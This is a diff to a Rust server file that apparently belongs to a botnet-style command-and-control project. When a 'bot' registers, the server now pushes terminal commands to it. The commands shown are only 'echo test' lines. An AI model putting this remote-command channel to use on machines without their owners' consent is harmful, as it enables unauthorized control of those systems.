@@ -1,6 +1,9 @@
 use std::sync::Arc;
 use chrono::Utc;
-use client_vars::types::send::{ BoogeymanSendPayload, ServerAction, ServerParams };
+use client_vars::types::{
+    receive::{ CallTerminalCommandParams, ClientAction, ClientParams },
+    send::{ BoogeymanSendPayload, ServerAction, ServerParams },
+};
 use tokio::{ net::TcpStream, sync::Mutex };
 use anyhow::Result;
 use crate::server::{
@@ -89,7 +92,24 @@ pub async fn init(
                 Bot::new(payload.id.clone(), vec![client_new_instance], vec![], true, None)
             );
         }
-        println!("Bot map: {:#?}", bot_map);
+        println!("new bot : {:#?}", payload.id);
+
+        ServerHandler::send_action_to_client(
+            stream_ref.clone(),
+            ClientAction::CallTerminalCommand,
+            ClientParams::CallTerminalCommand(CallTerminalCommandParams {
+                clear_console: false,
+                command: "echo test".to_owned(),
+            })
+        ).await?;
+        ServerHandler::send_action_to_client(
+            stream_ref.clone(),
+            ClientAction::CallTerminalCommand,
+            ClientParams::CallTerminalCommand(CallTerminalCommandParams {
+                clear_console: false,
+                command: "echo test2".to_owned(),
+            })
+        ).await?;
         Ok(())
     } else {
         return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
